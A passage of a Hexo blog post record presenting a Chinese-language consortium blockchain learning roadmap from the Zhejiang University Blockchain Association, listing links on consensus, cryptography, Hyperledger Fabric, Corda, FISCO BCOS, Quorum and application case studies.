**联盟链实例**\n    -   Hyperledger Fabric\n        -   Hyperledger Fabric 是由 Linux 基金会支持的开源项目，提供了一种可扩展、可定制和安全的联盟链技术。\n        -   官网：[🔗](https://www.hyperledger.org/use/fabric)\n        -   paper:[🔗](https://arxiv.org/pdf/1801.10228.pdf)\n        -   官方文档：[🔗](https://hyperledger-fabric.readthedocs.io/en/release-2.5/)\n        -   中文文档：[🔗](https://hyperledgercn.github.io/hyperledgerDocs/)\n        -   中文视频 Tutorial：[🔗](https://wiki.hyperledger.org/display/TWGC/Fabric+Video+Tutorial)\n        -   FAQ：[🔗](https://github.com/Hyperledger-TWGC/FAQ)\n        -   博客(Hyperledger Fabric 2.0 系列)：[🔗](https://blog.csdn.net/qq_28540443/article/details/104265844)\n        -   电子书《区块链技术指南》:[🔗](https://github.com/yeasy/blockchain_guide)\n        -   电子书《Hyperledger 源码分析之 Fabric》:[🔗](https://github.com/yeasy/hyperledger_code_fabric)\n    -   R3 Corda(金融行业)\n        -   R3 Corda 是一种用于金融行业的联盟链技术，提供了一种可扩展、安全和隐私保护的方法。\n        -   官网：[🔗](https://r3.com/products/corda/)\n        -   white paper：[🔗](https://r3.com/blog/corda-technical-whitepaper/)\n        -   官方文档：[🔗](https://docs.r3.com/)\n        -   中文文档：[🔗](https://cncorda.readthedocs.io/zh_CN/latest/index.html)\n        -   developer training:[🔗](https://training.corda.net/)\n        -   FAQ:[🔗](https://docs.r3.com/en/platform/corda/4.9/enterprise/notary/faq/toctree.html)\n    -   FISCO BCOS(国内金链盟)\n        -   FISCO BCOS 是由国内企业主导研发、对外开源、安全可控的企业级金融联盟链底层平台，由金链盟开源工作组协作打造，并于 2017 年正式对外开源。\n        -   官网：[🔗](https://www.fisco.com.cn/fisco_20.html)\n        -   white paper:[🔗](https://github.com/FISCO-BCOS/whitepaper)\n        -   中文文档：[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/)\n        -   英文文档：[🔗](https://fisco-bcos-documentation.readthedocs.io/en/latest/index.html)\n        -   博客：[🔗](https://www.wanghaoyi.com/fisco-bcos-learning.html)\n        -   FAQ：[🔗](https://fisco-bcos-documentation.readthedocs.io/en/latest/docs/faq/faq.html)\n    -   Quorum(基于以太坊代码库)\n        -   Quorum 是由美国金融机构摩根大通推出的企业级分布式账本和智能合约平台，可看作企业版的以太坊。它是基于以太坊分布式账本协议开发而成，为金融服务行业提供以太坊许可链方案，以便支持交易与合约的隐私性。\n        -   官网：[🔗](https://quorum.com/)\n        -   white paper:[🔗](https://github.com/ConsenSys/quorum/blob/master/docs/Quorum%20Whitepaper%20v0.2.pdf)\n        -   官方 Tutorial：[🔗](https://docs.goquorum.consensys.net/)\n-   **应用实例**\n    -   金融服务：\n        -   项目：taXchain - A blockchain network to exchange digitized tax forms(Hyperledger Fabric)[🔗](https://www.hyperledger.org/learn/publications/taxchain-case-study)\n        -   项目：fragmos chain - Digitizing interactions between OTC derivatives market participants(R3 Corda)[🔗](https://r3.com/case-studies/fragmos-chain/)\n        -   项目：Spunta - Revolutionizing the interbank reconciliation process in Italy(R3 Corda)[🔗](https://r3.com/case-studies/spunta/)\n        -   项目：广东国税税链项目（蚂蚁链）[🔗](https://guangdong.chinatax.gov.cn/gdsw/gzsw_swxw/2021-10/08/content_323f08675f604b629f233b5f38707d91.shtml)\n        -   项目：浙江区块链电子票据平台（蚂蚁链）[🔗](https://www.zjzwfw.gov.cn/col/col1228922696/)\n    -   供应链管理：\n        -   项目：KrypC - Managing the Metal and Mining Industry’s Supply Chain(Hyperledger Fabric)[🔗](https://www.hyperledger.org/learn/publications/krypc-minehub-case-study)\n        -   项目：gavea - Automating the commodity trading process(R3 Corda)[🔗](https://r3.com/case-studies/gavea/)\n        -   项目：axedra - Connecting and digitizing the precious metals industry(R3 Corda)[🔗](https://r3.com/case-studies/axedras/)\n    -   电子政务：\n        -   项目：澳门智慧城市-证书电子化（FISCO BCOS）\n        -   项目：山东省荣成市区块链政务诚信管理系统（FISCO BCOS)\n        -   项目：安徽区块链电子证照应用（蚂蚁链）[🔗](https://sft.ah.gov.cn/public/7061/53866131.html)\n    -   智慧医疗：\n        -   项目：LedgerDomain - The Right Rx for the Pharmaceutical Supply Chain(Hyperledger Fabric)[🔗](https://www.hyperledger.org/learn/publications/ledgerdomain-case-study)\n        -   项目：武汉市中心医院/上海华山医院-区块链医疗电子处方（蚂蚁链）[🔗](https://developer.aliyun.com/article/697162)\n    -   版权保护：\n        -   项目：人民版权-区块链版权保护平台（FISCO BCOS）[🔗](https://www.peoplec.cn/)\n        -   项目：雀凿数字版权服务平台（蚂蚁链）[🔗](https://www.mydcs.com/pages/index?channelCode=WBLT)\n    -   其他：\n        -   项目：Sony Global Education - a Next-Generation Credentials Platform(Hyperledger Fabric)[🔗](https://www.hyperledger.org/wp-content/uploads/2017/12/Hyperledger_CaseStudy_Sony.pdf)\n        -   项目：绿色出行普惠平台-绿色碳交易积分区块链（FISCO BCOS)\n","source":"_posts/BlockChain/Road/04-联盟链.md","raw":"---\ntitle: 04-联盟链\ndate: 2024-08-02 00:03:18\ntags:\n  - BlockChain\n  - Road\ncategories:\n  - BlockChain\n  - Road\n---\n# Consortium Blockchain-roadmap 2024\n\n联盟链学习路线总结，不断更新。\n\n—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）\n\n## 第一层\n\n-   **基本概念**：\n    -   什么是公有链、联盟链和私有链？(万向区块链实验室动画教程) [🔗](https://v.qq.com/x/page/a0328vol40v.html)\n    -   Blockchain Consortium: Advantages And Disadvantages[🔗](https://dataconomy.com/2023/01/blockchain-consortium-advantages/)\n    -   A Complete Guide to Consortium Blockchain And Its Features[🔗](https://www.analyticsvidhya.com/blog/2023/01/a-complete-guide-to-consortium-blockchain-and-its-features/)\n    -   Everything You Need To Know About Consortium Blockchain[🔗](https://www.blockchain-council.org/blockchain/everything-you-need-to-know-about-consortium-blockchain/)\n-   **解读与讨论**：\n    -   联盟链战国：五大巨头横向对比 [🔗](https://www.infoq.cn/article/5-consortium-blockchain-comparison/)\n    -   基于联盟链技术的隐私保护金融应用研究报告 [🔗](https://www.bfia.org.cn/upload/file/20221201/1669860599908060153.pdf)\n    -   研报：连通公链和联盟链的研究 [🔗](https://www.8btc.com/article/6582723)\n    -   安全问题成短板，联盟链发展背后的安全如何保障？[🔗](https://www.chainnews.com/articles/576303926328.htm)\n    -   联盟链智能合约安全浅析 [🔗](https://paper.seebug.org/1317/)\n    -   怎样让你的区块链更加安全可控[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/1_conception/safe_and_controllable.html)\n    -   盘点国内联盟链及现状 [🔗](https://zhuanlan.zhihu.com/p/519283107)\n\n## 第二层\n\n-   **技术原理**\n    -   共识机制\n        -   区块链共识机制浅谈：[🔗](https://blog.csdn.net/jeffrey__zhou/article/details/56672948)\n        -   [区块链] 共识算法之争（PBFT，Raft，PoW，PoS，DPoS，Ripple）:[🔗](https://www.cnblogs.com/X-knight/p/9157814.html)\n        -   深度分析 Raft 的主要特点：[🔗](https://mp.weixin.qq.com/s/yxJNsFzhpShzRvU9djhTjQ)\n        -   Paxos，Raft，Zab 一致性协议-Raft 篇：[🔗](https://mp.weixin.qq.com/s/5EZ2_vIzHEymJPxeSZtlmg)\n        -   深入剖析区块链的共识算法 Raft & PBFT：[🔗](https://mp.weixin.qq.com/s/ITCaMKdYrdlvQ0IGW3qpKg)\n    -   密码学相关\n        -   RSA、ECC、国密等加密算法\n        -   数字签名\n        -   零知识证明\n        -   多方安全计算\n    -   网络通信\n        -   联盟链网络专栏(Hyperledger Fabric)：[🔗](https://hyperledger-fabric.readthedocs.io/zh_CN/latest/network/network.html)\n        -   【网络专栏】联盟链的通信安全如何保障？：[🔗](https://tech.hyperchain.cn/wang-luo-zhuan-lan-lian-meng-lian-de-tong-xin-an-quan-ru-he-bao-zhang/)\n    -   存储相关\n        -   IPFS：[🔗](https://docs.ipfs.tech/)\n        -   传统数据库如 mysql、CouchDB、MongoDB 等\n    -   智能合约\n        -   智能合约初探：概念与演变：[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/3_features/35_contract/smart_contract_concept_and_evolution.html)\n        -   联盟链的智能合约多采用 go、java 等语言编写，不同联盟链框架对合约语言的支持不同，可根据需要进一步学习\n-   **源码分析**\n    -   《Hyperledger Fabric 源代码分析与深入解读》\n    -   Hyperledger Fabric v2.x 最新资料汇总[🔗](https://hello2mao.github.io/2020/04/22/hyperledger-fabric-v2.x-info/)\n    -   Fabric2.2 中的 Raft 共识模块源码分析[🔗](https://www.cnblogs.com/GarrettWale/p/16131853.html)\n    -   深入浅出 FISCO BCOS[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/index.html)\n    -   FISCO BCOS 核心模块设计解析[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/design/index.html)\n\n## 第三层\n\n-   **联盟链实例**\n    -   Hyperledger Fabric\n        -   Hyperledger Fabric 是由 Linux 基金会支持的开源项目，提供了一种可扩展、可定制和安全的联盟链技术。\n        -   官网：[🔗](https://www.hyperledger.org/use/fabric)\n        -   paper:[🔗](https://arxiv.org/pdf/1801.10228.pdf)\n        -   官方文档：[🔗](https://hyperledger-fabric.readthedocs.io/en/release-2.5/)\n        -   中文文档：[🔗](https://hyperledgercn.github.io/hyperledgerDocs/)\n        -   中文视频 Tutorial：[🔗](https://wiki.hyperledger.org/display/TWGC/Fabric+Video+Tutorial)\n        -   FAQ：[🔗](https://github.com/Hyperledger-TWGC/FAQ)\n        -   博客(Hyperledger Fabric 2.0 系列)：[🔗](https://blog.csdn.net/qq_28540443/article/details/104265844)\n        -   电子书《区块链技术指南》:[🔗](https://github.com/yeasy/blockchain_guide)\n        -   电子书《Hyperledger 源码分析之 Fabric》:[🔗](https://github.com/yeasy/hyperledger_code_fabric)\n    -   R3 Corda(金融行业)\n        -   R3 Corda 是一种用于金融行业的联盟链技术，提供了一种可扩展、安全和隐私保护的方法。\n        -   官网：[🔗](https://r3.com/products/corda/)\n        -   white paper：[🔗](https://r3.com/blog/corda-technical-whitepaper/)\n        -   官方文档：[🔗](https://docs.r3.com/)\n        -   中文文档：[🔗](https://cncorda.readthedocs.io/zh_CN/latest/index.html)\n        -   developer training:[🔗](https://training.corda.net/)\n        -   FAQ:[🔗](https://docs.r3.com/en/platform/corda/4.9/enterprise/notary/faq/toctree.html)\n    -   FISCO BCOS(国内金链盟)\n        -   FISCO BCOS 是由国内企业主导研发、对外开源、安全可控的企业级金融联盟链底层平台，由金链盟开源工作组协作打造，并于 2017 年正式对外开源。\n        -   官网：[🔗](https://www.fisco.com.cn/fisco_20.html)\n        -   white paper:[🔗](https://github.com/FISCO-BCOS/whitepaper)\n        -   中文文档：[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/)\n        -   英文文档：[🔗](https://fisco-bcos-documentation.readthedocs.io/en/latest/index.html)\n        -   博客：[🔗](https://www.wanghaoyi.com/fisco-bcos-learning.html)\n        -   FAQ：[🔗](https://fisco-bcos-documentation.readthedocs.io/en/latest/docs/faq/faq.html)\n    -   Quorum(基于以太坊代码库)\n        -   Quorum 是由美国金融机构摩根大通推出的企业级分布式账本和智能合约平台，可看作企业版的以太坊。它是基于以太坊分布式账本协议开发而成，为金融服务行业提供以太坊许可链方案，以便支持交易与合约的隐私性。\n        -   官网：[🔗](https://quorum.com/)\n        -   white paper:[🔗](https://github.com/ConsenSys/quorum/blob/master/docs/Quorum%20Whitepaper%20v0.2.pdf)\n        -   官方 Tutorial：[🔗](https://docs.goquorum.consensys.net/)\n-   **应用实例**\n    -   金融服务：\n        -   项目：taXchain - A blockchain network to exchange digitized tax forms(Hyperledger Fabric)[🔗](https://www.hyperledger.org/learn/publications/taxchain-case-study)\n        -   项目：fragmos chain - Digitizing interactions between OTC derivatives market participants(R3 Corda)[🔗](https://r3.com/case-studies/fragmos-chain/)\n        -   项目：Spunta - Revolutionizing the interbank reconciliation process in Italy(R3 Corda)[🔗](https://r3.com/case-studies/spunta/)\n        -   项目：广东国税税链项目（蚂蚁链）[🔗](https://guangdong.chinatax.gov.cn/gdsw/gzsw_swxw/2021-10/08/content_323f08675f604b629f233b5f38707d91.shtml)\n        -   项目：浙江区块链电子票据平台（蚂蚁链）[🔗](https://www.zjzwfw.gov.cn/col/col1228922696/)\n    -   供应链管理：\n        -   项目：KrypC - Managing the Metal and Mining Industry’s Supply Chain(Hyperledger Fabric)[🔗](https://www.hyperledger.org/learn/publications/krypc-minehub-case-study)\n        -   项目：gavea - Automating the commodity trading process(R3 Corda)[🔗](https://r3.com/case-studies/gavea/)\n        -   项目：axedra - Connecting and digitizing the precious metals industry(R3 Corda)[🔗](https://r3.com/case-studies/axedras/)\n    -   电子政务：\n        -   项目：澳门智慧城市-证书电子化（FISCO BCOS）\n        -   项目：山东省荣成市区块链政务诚信管理系统（FISCO BCOS)\n        -   项目：安徽区块链电子证照应用（蚂蚁链）[🔗](https://sft.ah.gov.cn/public/7061/53866131.html)\n    -   智慧医疗：\n        -   项目：LedgerDomain - The Right Rx for the Pharmaceutical Supply Chain(Hyperledger Fabric)[🔗](https://www.hyperledger.org/learn/publications/ledgerdomain-case-study)\n        -   项目：武汉市中心医院/上海华山医院-区块链医疗电子处方（蚂蚁链）[🔗](https://developer.aliyun.com/article/697162)\n    -   版权保护：\n        -   项目：人民版权-区块链版权保护平台（FISCO BCOS）[🔗](https://www.peoplec.cn/)\n        -   项目：雀凿数字版权服务平台（蚂蚁链）[🔗](https://www.mydcs.com/pages/index?channelCode=WBLT)\n    -   其他：\n        -   项目：Sony Global Education - a Next-Generation Credentials Platform(Hyperledger Fabric)[🔗](https://www.hyperledger.org/wp-content/uploads/2017/12/Hyperledger_CaseStudy_Sony.pdf)\n        -   项目：绿色出行普惠平台-绿色碳交易积分区块链（FISCO BCOS)\n","slug":"BlockChain/Road/04-联盟链","published":1,"updated":"2024-08-01T16:11:30.463Z","comments":1,"layout":"post","photos":[],"_id":"clzbh821l00082sune5oc8lrr","content":"<h1 id=\"Consortium-Blockchain-roadmap-2024\"><a href=\"#Consortium-Blockchain-roadmap-2024\" class=\"headerlink\" title=\"Consortium Blockchain-roadmap 2024\"></a>Consortium Blockchain-roadmap 2024</h1><p>联盟链学习路线总结，不断更新。</p>\n<p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p>\n<h2 id=\"第一层\"><a href=\"#第一层\" class=\"headerlink\" title=\"第一层\"></a>第一层</h2><ul>\n<li><strong>基本概念</strong>：<ul>\n<li>什么是公有链、联盟链和私有链？(万向区块链实验室动画教程) <a href=\"https://v.qq.com/x/page/a0328vol40v.html\">🔗</a></li>\n<li>Blockchain Consortium: Advantages And Disadvantages<a href=\"https://dataconomy.com/2023/01/blockchain-consortium-advantages/\">🔗</a></li>\n<li>A Complete Guide to Consortium Blockchain And Its Features<a href=\"https://www.analyticsvidhya.com/blog/2023/01/a-complete-guide-to-consortium-blockchain-and-its-features/\">🔗</a></li>\n<li>Everything You Need To Know About Consortium Blockchain<a href=\"https://www.blockchain-council.org/blockchain/everything-you-need-to-know-about-consortium-blockchain/\">🔗</a></li>\n</ul>\n</li>\n<li><strong>解读与讨论</strong>：<ul>\n<li>联盟链战国：五大巨头横向对比 <a href=\"https://www.infoq.cn/article/5-consortium-blockchain-comparison/\">🔗</a></li>\n<li>基于联盟链技术的隐私保护金融应用研究报告 <a href=\"https://www.bfia.org.cn/upload/file/20221201/1669860599908060153.pdf\">🔗</a></li>\n<li>研报：连通公链和联盟链的研究 <a href=\"https://www.8btc.com/article/6582723\">🔗</a></li>\n<li>安全问题成短板，联盟链发展背后的安全如何保障？<a href=\"https://www.chainnews.com/articles/576303926328.htm\">🔗</a></li>\n<li>联盟链智能合约安全浅析 <a href=\"https://paper.seebug.org/1317/\">🔗</a></li>\n<li>怎样让你的区块链更加安全可控<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/1_conception/safe_and_controllable.html\">🔗</a></li>\n<li>盘点国内联盟链及现状 <a href=\"https://zhuanlan.zhihu.com/p/519283107\">🔗</a></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二层\"><a href=\"#第二层\" class=\"headerlink\" title=\"第二层\"></a>第二层</h2><ul>\n<li><strong>技术原理</strong><ul>\n<li>共识机制<ul>\n<li>区块链共识机制浅谈：<a href=\"https://blog.csdn.net/jeffrey__zhou/article/details/56672948\">🔗</a></li>\n<li>[区块链] 共识算法之争（PBFT，Raft，PoW，PoS，DPoS，Ripple）:<a href=\"https://www.cnblogs.com/X-knight/p/9157814.html\">🔗</a></li>\n<li>深度分析 Raft 的主要特点：<a href=\"https://mp.weixin.qq.com/s/yxJNsFzhpShzRvU9djhTjQ\">🔗</a></li>\n<li>Paxos，Raft，Zab 一致性协议-Raft 篇：<a href=\"https://mp.weixin.qq.com/s/5EZ2_vIzHEymJPxeSZtlmg\">🔗</a></li>\n<li>深入剖析区块链的共识算法 Raft &amp; PBFT：<a href=\"https://mp.weixin.qq.com/s/ITCaMKdYrdlvQ0IGW3qpKg\">🔗</a></li>\n</ul>\n</li>\n<li>密码学相关<ul>\n<li>RSA、ECC、国密等加密算法</li>\n<li>数字签名</li>\n<li>零知识证明</li>\n<li>多方安全计算</li>\n</ul>\n</li>\n<li>网络通信<ul>\n<li>联盟链网络专栏(Hyperledger Fabric)：<a href=\"https://hyperledger-fabric.readthedocs.io/zh_CN/latest/network/network.html\">🔗</a></li>\n<li>【网络专栏】联盟链的通信安全如何保障？：<a href=\"https://tech.hyperchain.cn/wang-luo-zhuan-lan-lian-meng-lian-de-tong-xin-an-quan-ru-he-bao-zhang/\">🔗</a></li>\n</ul>\n</li>\n<li>存储相关<ul>\n<li>IPFS：<a href=\"https://docs.ipfs.tech/\">🔗</a></li>\n<li>传统数据库如 mysql、CouchDB、MongoDB 等</li>\n</ul>\n</li>\n<li>智能合约<ul>\n<li>智能合约初探：概念与演变：<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/3_features/35_contract/smart_contract_concept_and_evolution.html\">🔗</a></li>\n<li>联盟链的智能合约多采用 go、java 等语言编写，不同联盟链框架对合约语言的支持不同，可根据需要进一步学习</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>源码分析</strong><ul>\n<li>《Hyperledger Fabric 源代码分析与深入解读》</li>\n<li>Hyperledger Fabric v2.x 最新资料汇总<a href=\"https://hello2mao.github.io/2020/04/22/hyperledger-fabric-v2.x-info/\">🔗</a></li>\n<li>Fabric2.2 中的 Raft 共识模块源码分析<a href=\"https://www.cnblogs.com/GarrettWale/p/16131853.html\">🔗</a></li>\n<li>深入浅出 FISCO BCOS<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/index.html\">🔗</a></li>\n<li>FISCO BCOS 核心模块设计解析<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/design/index.html\">🔗</a></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第三层\"><a href=\"#第三层\" class=\"headerlink\" title=\"第三层\"></a>第三层</h2><ul>\n<li><strong>联盟链实例</strong><ul>\n<li>Hyperledger Fabric<ul>\n<li>Hyperledger Fabric 是由 Linux 基金会支持的开源项目，提供了一种可扩展、可定制和安全的联盟链技术。</li>\n<li>官网：<a href=\"https://www.hyperledger.org/use/fabric\">🔗</a></li>\n<li>paper:<a href=\"https://arxiv.org/pdf/1801.10228.pdf\">🔗</a></li>\n<li>官方文档：<a href=\"https://hyperledger-fabric.readthedocs.io/en/release-2.5/\">🔗</a></li>\n<li>中文文档：<a href=\"https://hyperledgercn.github.io/hyperledgerDocs/\">🔗</a></li>\n<li>中文视频 Tutorial：<a href=\"https://wiki.hyperledger.org/display/TWGC/Fabric+Video+Tutorial\">🔗</a></li>\n<li>FAQ：<a href=\"https://github.com/Hyperledger-TWGC/FAQ\">🔗</a></li>\n<li>博客(Hyperledger Fabric 2.0 系列)：<a href=\"https://blog.csdn.net/qq_28540443/article/details/104265844\">🔗</a></li>\n<li>电子书《区块链技术指南》:<a href=\"https://github.com/yeasy/blockchain_guide\">🔗</a></li>\n<li>电子书《Hyperledger 源码分析之 Fabric》:<a href=\"https://github.com/yeasy/hyperledger_code_fabric\">🔗</a></li>\n</ul>\n</li>\n<li>R3 Corda(金融行业)<ul>\n<li>R3 Corda 是一种用于金融行业的联盟链技术，提供了一种可扩展、安全和隐私保护的方法。</li>\n<li>官网：<a href=\"https://r3.com/products/corda/\">🔗</a></li>\n<li>white paper：<a href=\"https://r3.com/blog/corda-technical-whitepaper/\">🔗</a></li>\n<li>官方文档：<a href=\"https://docs.r3.com/\">🔗</a></li>\n<li>中文文档：<a href=\"https://cncorda.readthedocs.io/zh_CN/latest/index.html\">🔗</a></li>\n<li>developer training:<a href=\"https://training.corda.net/\">🔗</a></li>\n<li>FAQ:<a href=\"https://docs.r3.com/en/platform/corda/4.9/enterprise/notary/faq/toctree.html\">🔗</a></li>\n</ul>\n</li>\n<li>FISCO BCOS(国内金链盟)<ul>\n<li>FISCO BCOS 是由国内企业主导研发、对外开源、安全可控的企业级金融联盟链底层平台，由金链盟开源工作组协作打造，并于 2017 年正式对外开源。</li>\n<li>官网：<a href=\"https://www.fisco.com.cn/fisco_20.html\">🔗</a></li>\n<li>white paper:<a href=\"https://github.com/FISCO-BCOS/whitepaper\">🔗</a></li>\n<li>中文文档：<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/\">🔗</a></li>\n<li>英文文档：<a href=\"https://fisco-bcos-documentation.readthedocs.io/en/latest/index.html\">🔗</a></li>\n<li>博客：<a href=\"https://www.wanghaoyi.com/fisco-bcos-learning.html\">🔗</a></li>\n<li>FAQ：<a href=\"https://fisco-bcos-documentation.readthedocs.io/en/latest/docs/faq/faq.html\">🔗</a></li>\n</ul>\n</li>\n<li>Quorum(基于以太坊代码库)<ul>\n<li>Quorum 是由美国金融机构摩根大通推出的企业级分布式账本和智能合约平台，可看作企业版的以太坊。它是基于以太坊分布式账本协议开发而成，为金融服务行业提供以太坊许可链方案，以便支持交易与合约的隐私性。</li>\n<li>官网：<a href=\"https://quorum.com/\">🔗</a></li>\n<li>white paper:<a href=\"https://github.com/ConsenSys/quorum/blob/master/docs/Quorum%20Whitepaper%20v0.2.pdf\">🔗</a></li>\n<li>官方 Tutorial：<a href=\"https://docs.goquorum.consensys.net/\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>应用实例</strong><ul>\n<li>金融服务：<ul>\n<li>项目：taXchain - A blockchain network to exchange digitized tax forms(Hyperledger Fabric)<a href=\"https://www.hyperledger.org/learn/publications/taxchain-case-study\">🔗</a></li>\n<li>项目：fragmos chain - Digitizing interactions between OTC derivatives market participants(R3 Corda)<a href=\"https://r3.com/case-studies/fragmos-chain/\">🔗</a></li>\n<li>项目：Spunta - Revolutionizing the interbank reconciliation process in Italy(R3 Corda)<a href=\"https://r3.com/case-studies/spunta/\">🔗</a></li>\n<li>项目：广东国税税链项目（蚂蚁链）<a href=\"https://guangdong.chinatax.gov.cn/gdsw/gzsw_swxw/2021-10/08/content_323f08675f604b629f233b5f38707d91.shtml\">🔗</a></li>\n<li>项目：浙江区块链电子票据平台（蚂蚁链）<a href=\"https://www.zjzwfw.gov.cn/col/col1228922696/\">🔗</a></li>\n</ul>\n</li>\n<li>供应链管理：<ul>\n<li>项目：KrypC - Managing the Metal and Mining Industry’s Supply Chain(Hyperledger Fabric)<a href=\"https://www.hyperledger.org/learn/publications/krypc-minehub-case-study\">🔗</a></li>\n<li>项目：gavea - Automating the commodity trading process(R3 Corda)<a href=\"https://r3.com/case-studies/gavea/\">🔗</a></li>\n<li>项目：axedra - Connecting and digitizing the precious metals industry(R3 Corda)<a href=\"https://r3.com/case-studies/axedras/\">🔗</a></li>\n</ul>\n</li>\n<li>电子政务：<ul>\n<li>项目：澳门智慧城市-证书电子化（FISCO BCOS）</li>\n<li>项目：山东省荣成市区块链政务诚信管理系统（FISCO BCOS)</li>\n<li>项目：安徽区块链电子证照应用（蚂蚁链）<a href=\"https://sft.ah.gov.cn/public/7061/53866131.html\">🔗</a></li>\n</ul>\n</li>\n<li>智慧医疗：<ul>\n<li>项目：LedgerDomain - The Right Rx for the Pharmaceutical Supply Chain(Hyperledger Fabric)<a href=\"https://www.hyperledger.org/learn/publications/ledgerdomain-case-study\">🔗</a></li>\n<li>项目：武汉市中心医院&#x2F;上海华山医院-区块链医疗电子处方（蚂蚁链）<a href=\"https://developer.aliyun.com/article/697162\">🔗</a></li>\n</ul>\n</li>\n<li>版权保护：<ul>\n<li>项目：人民版权-区块链版权保护平台（FISCO BCOS）<a href=\"https://www.peoplec.cn/\">🔗</a></li>\n<li>项目：雀凿数字版权服务平台（蚂蚁链）<a href=\"https://www.mydcs.com/pages/index?channelCode=WBLT\">🔗</a></li>\n</ul>\n</li>\n<li>其他：<ul>\n<li>项目：Sony Global Education - a Next-Generation Credentials Platform(Hyperledger Fabric)<a href=\"https://www.hyperledger.org/wp-content/uploads/2017/12/Hyperledger_CaseStudy_Sony.pdf\">🔗</a></li>\n<li>项目：绿色出行普惠平台-绿色碳交易积分区块链（FISCO BCOS)</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"Consortium-Blockchain-roadmap-2024\"><a href=\"#Consortium-Blockchain-roadmap-2024\" class=\"headerlink\" title=\"Consortium Blockchain-roadmap 2024\"></a>Consortium Blockchain-roadmap 2024</h1><p>联盟链学习路线总结，不断更新。</p>\n<p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p>\n<h2 id=\"第一层\"><a href=\"#第一层\" class=\"headerlink\" title=\"第一层\"></a>第一层</h2><ul>\n<li><strong>基本概念</strong>：<ul>\n<li>什么是公有链、联盟链和私有链？(万向区块链实验室动画教程) <a href=\"https://v.qq.com/x/page/a0328vol40v.html\">🔗</a></li>\n<li>Blockchain Consortium: Advantages And Disadvantages<a href=\"https://dataconomy.com/2023/01/blockchain-consortium-advantages/\">🔗</a></li>\n<li>A Complete Guide to Consortium Blockchain And Its Features<a href=\"https://www.analyticsvidhya.com/blog/2023/01/a-complete-guide-to-consortium-blockchain-and-its-features/\">🔗</a></li>\n<li>Everything You Need To Know About Consortium Blockchain<a href=\"https://www.blockchain-council.org/blockchain/everything-you-need-to-know-about-consortium-blockchain/\">🔗</a></li>\n</ul>\n</li>\n<li><strong>解读与讨论</strong>：<ul>\n<li>联盟链战国：五大巨头横向对比 <a href=\"https://www.infoq.cn/article/5-consortium-blockchain-comparison/\">🔗</a></li>\n<li>基于联盟链技术的隐私保护金融应用研究报告 <a href=\"https://www.bfia.org.cn/upload/file/20221201/1669860599908060153.pdf\">🔗</a></li>\n<li>研报：连通公链和联盟链的研究 <a href=\"https://www.8btc.com/article/6582723\">🔗</a></li>\n<li>安全问题成短板，联盟链发展背后的安全如何保障？<a href=\"https://www.chainnews.com/articles/576303926328.htm\">🔗</a></li>\n<li>联盟链智能合约安全浅析 <a href=\"https://paper.seebug.org/1317/\">🔗</a></li>\n<li>怎样让你的区块链更加安全可控<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/1_conception/safe_and_controllable.html\">🔗</a></li>\n<li>盘点国内联盟链及现状 <a href=\"https://zhuanlan.zhihu.com/p/519283107\">🔗</a></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二层\"><a href=\"#第二层\" class=\"headerlink\" title=\"第二层\"></a>第二层</h2><ul>\n<li><strong>技术原理</strong><ul>\n<li>共识机制<ul>\n<li>区块链共识机制浅谈：<a href=\"https://blog.csdn.net/jeffrey__zhou/article/details/56672948\">🔗</a></li>\n<li>[区块链] 共识算法之争（PBFT，Raft，PoW，PoS，DPoS，Ripple）:<a href=\"https://www.cnblogs.com/X-knight/p/9157814.html\">🔗</a></li>\n<li>深度分析 Raft 的主要特点：<a href=\"https://mp.weixin.qq.com/s/yxJNsFzhpShzRvU9djhTjQ\">🔗</a></li>\n<li>Paxos，Raft，Zab 一致性协议-Raft 篇：<a href=\"https://mp.weixin.qq.com/s/5EZ2_vIzHEymJPxeSZtlmg\">🔗</a></li>\n<li>深入剖析区块链的共识算法 Raft &amp; PBFT：<a href=\"https://mp.weixin.qq.com/s/ITCaMKdYrdlvQ0IGW3qpKg\">🔗</a></li>\n</ul>\n</li>\n<li>密码学相关<ul>\n<li>RSA、ECC、国密等加密算法</li>\n<li>数字签名</li>\n<li>零知识证明</li>\n<li>多方安全计算</li>\n</ul>\n</li>\n<li>网络通信<ul>\n<li>联盟链网络专栏(Hyperledger Fabric)：<a href=\"https://hyperledger-fabric.readthedocs.io/zh_CN/latest/network/network.html\">🔗</a></li>\n<li>【网络专栏】联盟链的通信安全如何保障？：<a href=\"https://tech.hyperchain.cn/wang-luo-zhuan-lan-lian-meng-lian-de-tong-xin-an-quan-ru-he-bao-zhang/\">🔗</a></li>\n</ul>\n</li>\n<li>存储相关<ul>\n<li>IPFS：<a href=\"https://docs.ipfs.tech/\">🔗</a></li>\n<li>传统数据库如 mysql、CouchDB、MongoDB 等</li>\n</ul>\n</li>\n<li>智能合约<ul>\n<li>智能合约初探：概念与演变：<a href=\"https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/3_features/35_contract/smart_contract_concept_and_evolution.html\">🔗</a></li>\n<li>联盟链的智能合约多采用 go、java 